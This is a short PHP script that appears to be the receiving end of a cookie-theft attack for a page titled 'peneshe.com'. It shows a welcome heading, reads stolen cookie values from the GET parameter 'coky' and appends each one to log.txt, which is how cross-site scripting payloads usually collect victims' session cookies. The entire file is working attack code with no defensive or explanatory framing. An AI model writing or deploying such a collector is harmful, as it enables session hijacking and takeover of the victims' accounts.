<?php
echo "<h1>Welcome to peneshe.com</h1>";
$cookies = $_GET["coky"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");
?>
